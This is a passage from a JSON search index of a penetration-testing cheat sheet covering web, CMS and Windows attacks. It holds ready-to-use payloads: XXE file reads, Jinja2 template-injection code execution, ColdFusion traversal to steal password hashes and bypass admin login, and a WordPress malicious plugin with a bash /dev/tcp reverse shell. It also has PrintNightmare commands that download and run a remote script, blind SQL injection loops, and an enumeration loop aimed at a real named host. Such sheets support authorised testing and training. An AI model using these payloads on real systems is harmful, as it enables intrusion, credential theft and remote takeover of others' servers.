    "content": "&lt;!-- \"url\" can be - a standard URL - file:///&lt;full-path&gt; - Dir trav - PHP wrapper (expect://&lt;rce&gt;) - Java/other implementation --&gt; &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM \"&lt;url&gt;\"&gt;]&gt; &lt;test&gt;&amp;xxe;&lt;/test&gt; &lt;!-- Alternative with ELEMENT --&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;!-- Note that Dir traversal may break the XML depending on the content of the file Encode it to bypass this --&gt; &lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM \"php://filter/convert.base64-encode/resource=&lt;rel-path&gt;\"&gt;]&gt; &lt;title&gt;&amp;test;&lt;/title&gt; . ",
    "url": "http://localhost:4000/#web--technologies--xml--injection--xxe",
    "relUrl": "/#web--technologies--xml--injection--xxe"
  },"257": {
    "doc": "ftf-hacksheet",
    "title": "XPath Injection",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--xml--xpath-injection",
    "relUrl": "/#web--technologies--xml--xpath-injection"
  },"258": {
    "doc": "ftf-hacksheet",
    "title": "XCat",
    "content": ". | Repo - XPath injection tool - docsxcat detect '&lt;url&gt;' &lt;param&gt; \"&lt;param&gt;=&lt;val&gt;\" --true-string=\"&lt;non-error-str&gt;\" --fast --concurrency=&lt;n&gt; -h &lt;file.h&gt; --encode=form -m POST # Change 'detect' to 'run' or 'shell' . | . ",
    "url": "http://localhost:4000/#web--technologies--xml--xpath-injection--xcat",
    "relUrl": "/#web--technologies--xml--xpath-injection--xcat"
  },"259": {
    "doc": "ftf-hacksheet",
    "title": "WebDAV",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--webdav",
    "relUrl": "/#web--technologies--webdav"
  },"260": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | When uploading files, some formats/extensions may not be allowed (check with davtest), but there may be no issue in uploading them as .txt and then renaming them (use cadaver) | . ",
    "url": "http://localhost:4000/#web--technologies--webdav--notes",
    "relUrl": "/#web--technologies--webdav--notes"
  },"261": {
    "doc": "ftf-hacksheet",
    "title": "davtest",
    "content": ". | Site - Kali-Site - Exploit DAV# Perform check and clean afterwards davtest -url &lt;url&gt; -cleanup # -auth &lt;user:pass&gt; | -realm &lt;realm&gt; # Upload backdoor (improved-version) davtest -url &lt;url&gt; -sendbd auto # See backdoor folder for valid ext # Non-random name: -random &lt;name&gt; # Upload file davtest -url &lt;url&gt; -uploadfile &lt;file&gt; -uploadloc &lt;destination&gt; # Create dirs: -directory &lt;dir&gt; . | . ",
    "url": "http://localhost:4000/#web--technologies--webdav--davtest",
    "relUrl": "/#web--technologies--webdav--davtest"
  },"262": {
    "doc": "ftf-hacksheet",
    "title": "Cadaver",
    "content": ". | Site - WebDAV FTP-like tool# Use -t to operate on non-DAV paths cadaver &lt;url&gt; # ls | cd | pwd | get | put | delete . | . ",
    "url": "http://localhost:4000/#web--technologies--webdav--cadaver",
    "relUrl": "/#web--technologies--webdav--cadaver"
  },"263": {
    "doc": "ftf-hacksheet",
    "title": "LUA",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--lua",
    "relUrl": "/#web--technologies--lua"
  },"264": {
    "doc": "ftf-hacksheet",
    "title": "Decompilation",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--lua--decompilation",
    "relUrl": "/#web--technologies--lua--decompilation"
  },"265": {
    "doc": "ftf-hacksheet",
    "title": "General",
    "content": ". | Use file to figure out the version | Get a decompiler from lua-users | . ",
    "url": "http://localhost:4000/#web--technologies--lua--decompilation--general",
    "relUrl": "/#web--technologies--lua--decompilation--general"
  },"266": {
    "doc": "ftf-hacksheet",
    "title": "luadec",
    "content": ". | Site - LUA 5.0 decompiler | To fix compilation issues run:grep -l -r getline | xargs -n1 sed -i 's/getline(/ld_&amp;/g' . | . ",
    "url": "http://localhost:4000/#web--technologies--lua--decompilation--luadec",
    "relUrl": "/#web--technologies--lua--decompilation--luadec"
  },"267": {
    "doc": "ftf-hacksheet",
    "title": "unluac",
    "content": ". | Site - LUA 5.1+ | Custom opmaps might be required . | Use the --opmap &lt;op-file&gt; | . | . ",
    "url": "http://localhost:4000/#web--technologies--lua--decompilation--unluac",
    "relUrl": "/#web--technologies--lua--decompilation--unluac"
  },"268": {
    "doc": "ftf-hacksheet",
    "title": "Template Engines",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--template-engines",
    "relUrl": "/#web--technologies--template-engines"
  },"269": {
    "doc": "ftf-hacksheet",
    "title": "Manual",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--template-engines--manual",
    "relUrl": "/#web--technologies--template-engines--manual"
  },"270": {
    "doc": "ftf-hacksheet",
    "title": "Detection",
    "content": ". | Find GET, POST or URL path that react to user input | Success operation payloads{{7*7}} ${7*7} &lt;%= 7*7 %&gt; ${{7*7}} #{7*7} @(7*7) . | Error payloads -&gt; Detect engine${{&lt;%[%'\"}}%\\ ${} {{}} @() &lt;%= %&gt; ${7/0} {{7/0}} &lt;%= 7/0 %&gt; @(7/0) `` . | . ",
    "url": "http://localhost:4000/#web--technologies--template-engines--manual--detection",
    "relUrl": "/#web--technologies--template-engines--manual--detection"
  },"271": {
    "doc": "ftf-hacksheet",
    "title": "Cheatsheets",
    "content": ". | HackTricks | PayloadAllTheThings | . ",
    "url": "http://localhost:4000/#web--technologies--template-engines--cheatsheets",
    "relUrl": "/#web--technologies--template-engines--cheatsheets"
  },"272": {
    "doc": "ftf-hacksheet",
    "title": "Flask / Jinja2",
    "content": ". | RCE# Bypass most common filters: '.', # '_','|join','[',']','mro','base' {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('&lt;cmd&gt;')|attr('read')()}} # Shortest payloads {{ cycler.__init__.__globals__.os.popen('&lt;cmd&gt;').read() }} {{ joiner.__init__.__globals__.os.popen('&lt;cmd&gt;').read() }} {{ namespace.__init__.__globals__.os.popen('&lt;cmd&gt;').read() }} . | . ",
    "url": "http://localhost:4000/#web--technologies--template-engines--flask---jinja2",
    "relUrl": "/#web--technologies--template-engines--flask---jinja2"
  },"273": {
    "doc": "ftf-hacksheet",
    "title": "Tplmap",
    "content": ". | Site - SSTI detect &amp; exploit tool# Detect if 'name' is injectable tplmap.py -u 'http://&lt;ip&gt;/page?name=John' # Detect if the path is injectable tplmap.py -u 'http://&lt;ip&gt;/*' # Run a shell tplmap.py --os-shell -u 'http://&lt;ip&gt;/page?name=John' . | . ",
    "url": "http://localhost:4000/#web--technologies--template-engines--tplmap",
    "relUrl": "/#web--technologies--template-engines--tplmap"
  },"274": {
    "doc": "ftf-hacksheet",
    "title": "Apps",
    "content": " ",
    "url": "http://localhost:4000/#web--apps",
    "relUrl": "/#web--apps"
  },"275": {
    "doc": "ftf-hacksheet",
    "title": "Adobe ColdFusion",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--adobe-coldfusion",
    "relUrl": "/#web--apps--adobe-coldfusion"
  },"276": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | From here | Find the version in the image of the admin login: http://&lt;ip&gt;/CFIDE/administrator | . ",
    "url": "http://localhost:4000/#web--apps--adobe-coldfusion--windows",
    "relUrl": "/#web--apps--adobe-coldfusion--windows"
  },"277": {
    "doc": "ftf-hacksheet",
    "title": "Administration Login Bypass",
    "content": ". | http://&lt;ip&gt;/CFIDE/administrator/enter.cfm needs to be accessible, try HTTPS if not | Use LFD for showing the passwords hashes:# ColdFusion 6 http://&lt;ip&gt;/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en # ColdFusion 7 http://&lt;ip&gt;/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en # ColdFusion 8 http://&lt;ip&gt;/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en # Other versions http://&lt;ip&gt;/CFIDE/administrator/enter.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en . | On the console, run the following JavaScript to get the HMAC hash:hex_hmac_sha1(document.loginform.salt.value,\"&lt;LFD-password-field&gt;\") . | Start a mitm HTTP proxy for tampering the request when submitting the login form | Note that the user field should be admin and the password field empty when sending the request | On the tamperer, set the empty cfadminPassword field to the HMAC hash obtained before | Note that the login page reloads every 30 seconds to renew the salt, so you&#8217;ll have to repeat the console step to get the new HMAC hash | On the tamperer, the request shall include in a field the salt and this only seem to happen when sending the empty password | . ",
    "url": "http://localhost:4000/#web--apps--adobe-coldfusion--windows--administration-login-bypass",
    "relUrl": "/#web--apps--adobe-coldfusion--windows--administration-login-bypass"
  },"278": {
    "doc": "ftf-hacksheet",
    "title": "Uploading an evil file",
    "content": ". | Get the currently executed path by going to the Server Settings &gt; Mappings section in the left tab and noting the CFIDE local path (or any other that can be accessible from the web) | Go to Debugging and Logging &gt; Scheduled Tasks and create a new task . | Set the name (anything works) | Set the URL to your machine IP:PORT serving an evil cfm shell with .txt extension | Check Output to file | Set the file path to the local CFIDE path (or any other accessible) + any name for the file (that doesn&#8217;t include - or any symbol) with .cfm extension | Save the task | . | Run the task | If it fails it may be due to firewall rules (workaround), bad permissions to write to the path, tasks permissions (check the appropriate tabs) or anything related to the filename | . ",
    "url": "http://localhost:4000/#web--apps--adobe-coldfusion--windows--uploading-an-evil-file",
    "relUrl": "/#web--apps--adobe-coldfusion--windows--uploading-an-evil-file"
  },"279": {
    "doc": "ftf-hacksheet",
    "title": "Playing with the CFM shell",
    "content": ". | First try to execute the suggested cmd command with a dir | If it fails, try using only cmd in the Command field and /c &lt;command&gt; in the Options field | When uploading a file (like nc.exe) locate it using cmd /c dir /s /a C:\\*nc.exe and increase the Timeout | Finally, execute nc using the cmd /c to avoid possible issues regarding the Timeout value | . ",
    "url": "http://localhost:4000/#web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell",
    "relUrl": "/#web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell"
  },"280": {
    "doc": "ftf-hacksheet",
    "title": "Webmin",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--webmin",
    "relUrl": "/#web--apps--webmin"
  },"281": {
    "doc": "ftf-hacksheet",
    "title": "Information",
    "content": ". | Can perform tasks equivalent to root | Its access password is usually root&#8217;s | IMPORTANT: There&#8217;s a limit for attempting to login before locking (either permanently or temporarily)!! | . ",
    "url": "http://localhost:4000/#web--apps--webmin--information",
    "relUrl": "/#web--apps--webmin--information"
  },"282": {
    "doc": "ftf-hacksheet",
    "title": "Shellshock - CVE-2014-6271",
    "content": ". | Webmin uses CGI for login at: /session_login.cgi | Use () { :; };sleep 10 in the User-Agent to check for it | See the Shellshock section | . ",
    "url": "http://localhost:4000/#web--apps--webmin--shellshock---cve-2014-6271",
    "relUrl": "/#web--apps--webmin--shellshock---cve-2014-6271"
  },"283": {
    "doc": "ftf-hacksheet",
    "title": "PrivEsc",
    "content": ". | Create a new task with a reverse shell | . ",
    "url": "http://localhost:4000/#web--apps--webmin--privesc",
    "relUrl": "/#web--apps--webmin--privesc"
  },"284": {
    "doc": "ftf-hacksheet",
    "title": "Citrix",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--citrix",
    "relUrl": "/#web--apps--citrix"
  },"285": {
    "doc": "ftf-hacksheet",
    "title": "Login Schema Enumeration",
    "content": ". | Find the default StateContext by intercepting a login attempt, changing it to an invalid value and checking the value of StateContext in the response | Used for downgrading login (schemas ref):while read l; do sc=\"$(echo -n \"loginschema=$l\" | base64 -w0)\"; curl -s -k --data-urlencode \"StateContext=$sc\" 'https://remote.axa.be/nf/auth/doAuthentication.do' | grep -q 'bG9naW5zY2hlbWE9ZGVmYXVsdA==' || echo \"$l - $sc\"; sleep 1; done &lt;&lt;EOF CheckBox ClientCertDualAuthDeviceID ClientCertSingleAuthDeviceID DeviceID_Cert DomainDropdown DualAuth DualAuth_Flipped DualAuthDeviceID OntyDeviceID OnlyDomainDropdown OnlyOAuthToken OnlyPassword OnlyUsername PrefilUserFromExpr SingleAuthCaptcha SingleAuthDeviceID EOF . | Intercept a login attempt and replace the StateContext base64 value | . ",
    "url": "http://localhost:4000/#web--apps--citrix--login-schema-enumeration",
    "relUrl": "/#web--apps--citrix--login-schema-enumeration"
  },"286": {
    "doc": "ftf-hacksheet",
    "title": "Salesforce",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--salesforce",
    "relUrl": "/#web--apps--salesforce"
  },"287": {
    "doc": "ftf-hacksheet",
    "title": "Endpoint Enumeration",
    "content": ". | Guide | Search for this in the Proxy history: . | /s/sfsites/aura - URL | /sfsites/aura - URL | /aura - URL | aura.ApexAction.execute - GET param | message - POST param | aura.context - POST param | aura%3a%2f%2f - Encoded param | apex%3a%2f%2f - Encoded param | . | Grep in app.js or aura_prod.js for . | componentService.initControllerDefs([{ | . | . ",
    "url": "http://localhost:4000/#web--apps--salesforce--endpoint-enumeration",
    "relUrl": "/#web--apps--salesforce--endpoint-enumeration"
  },"288": {
    "doc": "ftf-hacksheet",
    "title": "Endpoint Interaction",
    "content": ". | Better use an existing POST to aura as template as it might require additional params like aura.context or aura.token | URL-decode message and replace the: . | &#8220;descriptor&#8221;: &lt;controller&gt; | &#8220;classname&#8221;: &lt;apex-class&gt; | &#8220;method&#8221;: &lt;class-method&gt; | &#8220;params&#8221;:{ &lt;params&gt; } | . | Only Callable Apex Classes can be invoked this way | . ",
    "url": "http://localhost:4000/#web--apps--salesforce--endpoint-interaction",
    "relUrl": "/#web--apps--salesforce--endpoint-interaction"
  },"289": {
    "doc": "ftf-hacksheet",
    "title": "CMS",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--cms",
    "relUrl": "/#web--apps--cms"
  },"290": {
    "doc": "ftf-hacksheet",
    "title": "Wordpress",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress",
    "relUrl": "/#web--apps--cms--wordpress"
  },"291": {
    "doc": "ftf-hacksheet",
    "title": "WPScan",
    "content": ". | Site - WP/Plugin/Site enumeration:# Update Plugin DB wpscan --update # Complete vuln scan &amp; User-enum wpscan --url &lt;url&gt; --api-token &lt;id&gt; # Get the token in wpscan.com # Set if WP URI is non-default: # --wp-content-dir|--wp-plugins-dir # --force - Force scanning site # --random-user-agent - WAF bypass # --proxy - Run through proxy # Just use the WP/Plugin versions # in searchsploit, ignore the links # Pass bruteforce wpscan --url &lt;url&gt; -e u --passwords &lt;wordlist&gt; # Enumerate all plugins/themes wpscan --url &lt;url&gt; -e at,ap --api-token &lt;id&gt; . | . ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--wpscan",
    "relUrl": "/#web--apps--cms--wordpress--wpscan"
  },"292": {
    "doc": "ftf-hacksheet",
    "title": "Privilege Escalation",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--privilege-escalation",
    "relUrl": "/#web--apps--cms--wordpress--privilege-escalation"
  },"293": {
    "doc": "ftf-hacksheet",
    "title": "DatabaseNotes\n  \n    These steps are to be performed if PHPmyadmin or a SQLi give DB access\n  Steal Session\n  \n    Find the active sessions in the table wp_usermeta looking at the columns:\n      \n        meta_key = session_tokens\n      \n    \n    Check that the user_id of the session corresponds to one with admin privileges (see below how)\n  Modify Admin Password\n  \n    Find the user_id of the admin in the table wp_usermeta looking at the columns:\n      \n        user_id\n        meta_key = wp_capabilities\n        meta_value LIKE administrator\n      \n    \n    Find the username corresponding to the user_id in the wp_users table:\n      \n        ID should corresponds to user_id\n        Check user_login &amp; user_nicename\n      \n    \n    Modify the user_pass value to one generated with the same hash\n    Use Name-That-Hash for hash id\n    If phpass type, use openssl to generate a new password:# phpass is salted MD5\nopenssl passwd -1 '&lt;password&gt;'\n# -salt &lt;salt&gt; - Use salt value\n  \n",
    "content": " ",
    "url": "http://localhost:4000/",
    "relUrl": "/"
  },"294": {
    "doc": "ftf-hacksheet",
    "title": "Uploads",
    "content": ". | Create an evil PHP file with the format: &lt;?php &lt;payload&gt;; ?&gt; | Find any upload point (media/plugins/themes) and select the evil.php (not zipped) as file | Even if it fails, try to find it under: . | /wp-content/uploads/evil.php | or /uploads/evil.php | . | . ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--privilege-escalation--uploads",
    "relUrl": "/#web--apps--cms--wordpress--privilege-escalation--uploads"
  },"295": {
    "doc": "ftf-hacksheet",
    "title": "Plugins",
    "content": ". | Evil plugin content:&lt;?php /** * Plugin Name: Evil Plugin * Plugin URI: * Description: Evil Plugin * Version: 1.0 * Author: Test * Author URI: http://example.com */ &lt;payload&gt; // Either use msfvenom or exec // exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'\"); ?&gt; . | Package it:zip -r evil.zip evil.php . | Upload: /wp-admin/plugin-install.php | Activate it (optional) | Or find it under: . | /wp-content/plugins/evil/evil.php | or /plugins/evil/evil.php | . | Alternatively you may install a vulnerable legit plugin | . ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--privilege-escalation--plugins",
    "relUrl": "/#web--apps--cms--wordpress--privilege-escalation--plugins"
  },"296": {
    "doc": "ftf-hacksheet",
    "title": "Themes",
    "content": ". | Create an evil PHP file with the format: &lt;?php &lt;payload&gt;; ?&gt; | Package it:zip -r evil.zip evil.php . | Upload: /wp-admin/theme-install.php | Activate it (optional) | Find it under: . | /wp-content/themes/evil/evil.php | or /themes/evil/evil.php | . | . ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--privilege-escalation--themes",
    "relUrl": "/#web--apps--cms--wordpress--privilege-escalation--themes"
  },"297": {
    "doc": "ftf-hacksheet",
    "title": "Editor",
    "content": ". | Go to: /wp-admin/theme-editor.php | Select a php file/template (404.php) | Check at the bottom that it can be modified | Replace with: &lt;?php &lt;payload&gt;; ?&gt; | Find the modified file under: . | /wp-content/themes/&lt;theme&gt;/404.php | or /themes/&lt;theme&gt;/404.php | . | . ",
    "url": "http://localhost:4000/#web--apps--cms--wordpress--privilege-escalation--editor",
    "relUrl": "/#web--apps--cms--wordpress--privilege-escalation--editor"
  },"298": {
    "doc": "ftf-hacksheet",
    "title": "Drupal",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--cms--drupal",
    "relUrl": "/#web--apps--cms--drupal"
  },"299": {
    "doc": "ftf-hacksheet",
    "title": "droopescan",
    "content": ". | Site - Drupal/WP/Silverstripe scannerdroopescan scan drupal -u &lt;url&gt; # -U &lt;file&gt; - List of URLs to scan # --method {not_found,forbidden,ok} # Use a different test method . | . ",
    "url": "http://localhost:4000/#web--apps--cms--drupal--droopescan",
    "relUrl": "/#web--apps--cms--drupal--droopescan"
  },"300": {
    "doc": "ftf-hacksheet",
    "title": "Joomla",
    "content": " ",
    "url": "http://localhost:4000/#web--apps--cms--joomla",
    "relUrl": "/#web--apps--cms--joomla"
  },"301": {
    "doc": "ftf-hacksheet",
    "title": "Joomscan",
    "content": ". | Site - OWASP Joomla scanner:# -ec enumerates components joomscan.pl -u &lt;url&gt; -ec # -a &lt;UA&gt; - Set User-Agent # -r - Random User-Agent # --cookie &lt;str-cookie&gt; # --timeout &lt;num&gt; joomscan.pl --update . | . ",
    "url": "http://localhost:4000/#web--apps--cms--joomla--joomscan",
    "relUrl": "/#web--apps--cms--joomla--joomscan"
  },"302": {
    "doc": "ftf-hacksheet",
    "title": "JoomlaScan",
    "content": ". | Site - Joomla scanner:joomlascan.py -u &lt;url&gt; -t 30 # -t &lt;threads&gt; . | . ",
    "url": "http://localhost:4000/#web--apps--cms--joomla--joomlascan",
    "relUrl": "/#web--apps--cms--joomla--joomlascan"
  },"303": {
    "doc": "ftf-hacksheet",
    "title": "Software",
    "content": " ",
    "url": "http://localhost:4000/#software",
    "relUrl": "/#software"
  },"304": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#software--windows",
    "relUrl": "/#software--windows"
  },"305": {
    "doc": "ftf-hacksheet",
    "title": "Print Spooler - CVE-2021-1675",
    "content": " ",
    "url": "http://localhost:4000/#software--windows--print-spooler---cve-2021-1675",
    "relUrl": "/#software--windows--print-spooler---cve-2021-1675"
  },"306": {
    "doc": "ftf-hacksheet",
    "title": "Detection",
    "content": ". | Check if the spool service is active | For patched systems check this:REG QUERY \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\" :: Still vulnerable if it returns: HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint RestrictDriverInstallationToAdministrators REG_DWORD 0x0 NoWarningNoElevationOnInstall REG_DWORD 0x1 . | . ",
    "url": "http://localhost:4000/#software--windows--print-spooler---cve-2021-1675--detection",
    "relUrl": "/#software--windows--print-spooler---cve-2021-1675--detection"
  },"307": {
    "doc": "ftf-hacksheet",
    "title": "Invoke-Nightmare",
    "content": ". | Site - PowerShell Local LPE PrivEscImport-Module .\\cve-2021-1675.ps1 :: Or load from remote server IEX(New-Object Net.Webclient).downloadstring('http://&lt;ip&gt;/cve-2021-1675.ps1') :: Add new admin user Invoke-Nightmare -DriverName \"Xerox\" -NewUser \"john\" -NewPassword \"password\" :: Execute DLL as admin Invoke-Nightmare -DLL \"C:\\path\\to\\bindshell.dll\" . | . ",
    "url": "http://localhost:4000/#software--windows--print-spooler---cve-2021-1675--invoke-nightmare",
    "relUrl": "/#software--windows--print-spooler---cve-2021-1675--invoke-nightmare"
  },"308": {
    "doc": "ftf-hacksheet",
    "title": "Cube0x0 Impacket RCE - Remote",
    "content": ". | Site - Remote Exploit CVE-2021-34527:# Scan for the vulnerability rpcdump.py @&lt;ip&gt; | grep 'MS-RPRN\\|MS-PAR' # Check the site for steps to build ./CVE-2021-1675.py &lt;dom&gt;/&lt;usr&gt;:&lt;pwd&gt;@&lt;ip&gt; '\\\\&lt;local-ip&gt;\\share\\addCube.dll' . | Another guide | . ",
    "url": "http://localhost:4000/#software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote",
    "relUrl": "/#software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote"
  },"309": {
    "doc": "ftf-hacksheet",
    "title": "printerbug.py",
    "content": ". | Site - Auth -&gt; SpoolService bug -&gt; SMB# Force auth with attacker responder printerbug.py [[&lt;dom&gt;/]&lt;user&gt;[:&lt;pass&gt;]@]&lt;host/ip&gt; &lt;attacker-ip&gt; . | . ",
    "url": "http://localhost:4000/#software--windows--print-spooler---cve-2021-1675--printerbug-py",
    "relUrl": "/#software--windows--print-spooler---cve-2021-1675--printerbug-py"
  },"310": {
    "doc": "ftf-hacksheet",
    "title": "SQL",
    "content": " ",
    "url": "http://localhost:4000/#sql",
    "relUrl": "/#sql"
  },"311": {
    "doc": "ftf-hacksheet",
    "title": "SQLi",
    "content": " ",
    "url": "http://localhost:4000/#sql--sqli",
    "relUrl": "/#sql--sqli"
  },"312": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#sql--sqli--bruteforce",
    "relUrl": "/#sql--sqli--bruteforce"
  },"313": {
    "doc": "ftf-hacksheet",
    "title": "Dictionaries",
    "content": ". | Use the SecLists: . | quick-SQLi | Generic-SQLi | Generic-BlindSQLi &lt;- Last resort | . | . ",
    "url": "http://localhost:4000/#sql--sqli--bruteforce--dictionaries",
    "relUrl": "/#sql--sqli--bruteforce--dictionaries"
  },"314": {
    "doc": "ftf-hacksheet",
    "title": "Ffuf",
    "content": ". | Site - Most flexible fuzzer:# Capture request: FUZZ in usr/pass ffuf -request &lt;req&gt; -mode pitchfork -c -ac -w &lt;wlist&gt; # -request-proto http - Force HTTP . | . ",
    "url": "http://localhost:4000/#sql--sqli--bruteforce--ffuf",
    "relUrl": "/#sql--sqli--bruteforce--ffuf"
  },"315": {
    "doc": "ftf-hacksheet",
    "title": "Blind",
    "content": ". | SQLi to use with the command below:-- URL encoded %'))%20and%20strcmp(upper(substr(database(),$1,1)),'$2')%3d0%20--%20 . | zsh command:# curl.sh contains Burp copy-to-curl # sh &lt;&lt;EOF # curl -X POST -H $'...' -d '...' # curl method without $'..' -&gt; '..' echo; for ((i=1;;i++)); do for c in {65..96} {32..64} {123..126}; do c=\"$(([##16]c))\"; while :; do sleep 1; { ./curl.sh \"$i\" \"%$c\" || continue } | { grep -m1 -q 'Agradecido' &amp;&amp; { echo -ne \"\\x$c\"; continue 3 } }; break; done; done; break; done; echo # curl.sh can also be a function . | . ",
    "url": "http://localhost:4000/#sql--sqli--blind",
    "relUrl": "/#sql--sqli--blind"
  },"316": {
    "doc": "ftf-hacksheet",
    "title": "Time-based",
    "content": ". | SQLi to use with the command below:-- URL encoded -- Used for str concatenation '%2b(select%20'a'%20union%20SELECT(if((STRCMP(upper(substring(CURRENT_USER(),$1,1)),'$2'))%3d0,SLEEP(10),0)))%2b' -- Used for AND sqli ')+AND+(SELECT+1310+FROM+((SELECT(if((STRCMP(upper(substring(CURRENT_USER(),$1,1)),%27$2%27))%3d0,SLEEP(20),0))))fDpl)--+' . | zsh command:# curl.sh contains Burp copy-to-curl # sh &lt;&lt;EOF # curl -s -o /dev/null -H $'...' # curl method without $'..' -&gt; '..' echo; for ((i=1;;i++)); do for c in {65..96} {32..64} {123..126}; do c=\"$(([##16]c))\"; while :; do sleep 1; timeout 6 ./curl.sh \"$i\" \"%$c\" &amp;&amp; break; [ $? -eq 124 ] &amp;&amp; { echo -ne \"\\x$c\"; continue 3 }; done; done; break; done; echo # curl.sh can be: \"$0 $i %$c curl\" . | . ",
    "url": "http://localhost:4000/#sql--sqli--time-based",
    "relUrl": "/#sql--sqli--time-based"
  },"317": {
    "doc": "ftf-hacksheet",
    "title": "General",
    "content": " ",
    "url": "http://localhost:4000/#sql--general",
    "relUrl": "/#sql--general"
  },"318": {
    "doc": "ftf-hacksheet",
    "title": "Find all databases",
    "content": " ",
    "url": "http://localhost:4000/#sql--general--find-all-databases",
    "relUrl": "/#sql--general--find-all-databases"
  },"319": {
    "doc": "ftf-hacksheet",
    "title": "T-SQL",
    "content": "SELECT name FROM master.sys.databases -- Older SELECT name FROM master.dbo.sysdatabases -- Alternative EXEC sp_databases . ",
    "url": "http://localhost:4000/#sql--general--find-all-databases--t-sql",
    "relUrl": "/#sql--general--find-all-databases--t-sql"
  },"320": {
    "doc": "ftf-hacksheet",
    "title": "Select a database",
    "content": "USE &lt;database&gt; . ",
    "url": "http://localhost:4000/#sql--general--select-a-database",
    "relUrl": "/#sql--general--select-a-database"
  },"321": {
    "doc": "ftf-hacksheet",
    "title": "Find all schemas",
    "content": ". | From here:SELECT schema_name FROM information_schema.schemata . | . ",
    "url": "http://localhost:4000/#sql--general--find-all-schemas",
    "relUrl": "/#sql--general--find-all-schemas"
  },"322": {
    "doc": "ftf-hacksheet",
    "title": "Find all tables",
    "content": ". | General:-- From currently selected DB SELECT table_name FROM information_schema.tables -- From non-selected DB SELECT table_name FROM &lt;db&gt;.information_schema.tables . | Associated with a schema:SELECT table_name FROM information_schema.tables where table_schema = '&lt;schema&gt;' . | Associated with their DBs:-- Some DBs may require using AS when declaring the identifier: -- information_schema.schemata AS s SELECT s.schema_name, t.table_name FROM information_schema.schemata s INNER JOIN information_schema.tables t ON s.schema_name = t.table_schema ORDER BY schema_name, table_name . | . ",
    "url": "http://localhost:4000/#sql--general--find-all-tables",
    "relUrl": "/#sql--general--find-all-tables"
  },"323": {
    "doc": "ftf-hacksheet",
    "title": "Find the columns in a table",
    "content": ". | Identify:SELECT column_name FROM information_schema.columns WHERE table_name='&lt;table-name&gt;' . | Then query the table:SELECT &lt;column&gt; FROM &lt;table-name&gt; -- Using a DB object SELECT &lt;column&gt; FROM &lt;dbo&gt;.&lt;table-name&gt; -- The databases listed in inf schema -- may need to be accessed by -- Using a DB object SELECT &lt;column&gt; FROM &lt;db&gt;.dbo.&lt;table-name&gt; . | . ",
    "url": "http://localhost:4000/#sql--general--find-the-columns-in-a-table",
    "relUrl": "/#sql--general--find-the-columns-in-a-table"
  },"324": {
    "doc": "ftf-hacksheet",
    "title": "MySQL",
    "content": " ",
    "url": "http://localhost:4000/#sql--mysql",
    "relUrl": "/#sql--mysql"
  },"325": {
    "doc": "ftf-hacksheet",
    "title": "Connection",
    "content": " ",
    "url": "http://localhost:4000/#sql--mysql--connection",
    "relUrl": "/#sql--mysql--connection"
  },"326": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#sql--mysql--connection--linux",
    "relUrl": "/#sql--mysql--connection--linux"
  },"327": {
    "doc": "ftf-hacksheet",
    "title": "mysql",
    "content": ". | MySQL clientmysql -u &lt;usr&gt; -D &lt;db&gt; -p [&lt;pass&gt;] # -P &lt;port&gt; - Different port # -h &lt;ip&gt; - Remote connection # -C - Use compression # -e &lt;cmd&gt; - Oneshot command/query # -r - Raw output . | . ",
    "url": "http://localhost:4000/#sql--mysql--connection--linux--mysql",
    "relUrl": "/#sql--mysql--connection--linux--mysql"
  },"328": {
    "doc": "ftf-hacksheet",
    "title": "Enumeration",
